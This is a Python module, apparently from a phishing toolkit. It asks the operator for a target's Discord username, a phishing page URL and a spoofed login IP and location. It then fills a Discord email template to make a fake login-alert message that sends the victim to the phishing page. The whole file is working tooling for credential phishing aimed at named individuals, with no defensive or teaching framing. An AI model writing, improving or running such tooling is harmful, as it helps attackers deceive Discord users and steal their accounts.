from Modules.UI import *

def mailParser():
    clear()
    banner()
    clear()
    banner()
    print(style.YELLOW('--Fill the folowing credentials for Discord phishing email--'))
    print(style.GREEN('\n[+]') + style.RESET("Enter the target's Discord username:"))
    mailParser.targetUsername  = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET("Enter you'r phishing page URL:"))
    mailParser.redirectURL = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(style.GREEN('\n[+]') + style.RESET('Enter the login country: '))
    mailParser.loginCountry = str(input(style.CYAN(">>> ") + style.RESET('')))
    print(r'''
.---------------------.-----------------.-----------.
| [1] 162.243.110.124 |  United States  | New York  |
:---------------------+-----------------+-----------:
| [2] 178.239.173.40  |  Netherlands    | Amsterdam |
:---------------------+-----------------+-----------:
| [3] 27.109.7.244    |  India          | Vadodara  |
:---------------------+-----------------+-----------:
| [4] 80.233.46.215   |  Ireland        | Dublin    |
'---------------------'-----------------'-----------' ''')
    print(style.GREEN('[+]') + style.RESET('Enter the number of the IP from the table or enter your own IP (000.000.000.000)'))
    mailParser.IP = str(input(style.GREEN('>>> ') + style.RESET('')))
    ips = ['162.243.110.124', '178.239.173.40', '27.109.7.244', '80.233.46.215']
    countries = ['America', 'Netherlands', 'India', 'Ireland']
    cities    = ['New York', 'Amsterdam', 'Vadodara', 'Dublin']
    if int(mailParser.IP.replace('.','')) >= 1 and int(mailParser.IP.replace('.', '')) <= 4:
        ip = int(mailParser.IP) - 1
        mailParser.IP = ips[ip]
        mailParser.loginCountry = countries[ip]
        mailParser.loginCity    = cities[ip]
    else:
        mailParser.IP = mailParser.IP
        print(style.GREEN('\n[+]') + style.RESET('Enter the login country: '))
        mailParser.loginCountry = str(input(style.CYAN(">>> ") + style.RESET('')))




def pageGenerator_DC():
    mailParser()
    fin = open("Templates/Discord.html", "rt")
    fout = open("Templates/TempTemplates/DiscordTemplate.html", "wt")
    for line in fin:
        fout.write(line.replace('#USERNAME', mailParser.targetUsername).replace('#CITY', mailParser.loginCity).replace('#COUNTRY', mailParser.loginCountry).replace('#URL', mailParser.redirectURL).replace('#IP', mailParser.IP))
    fin.close()
    fout.close()
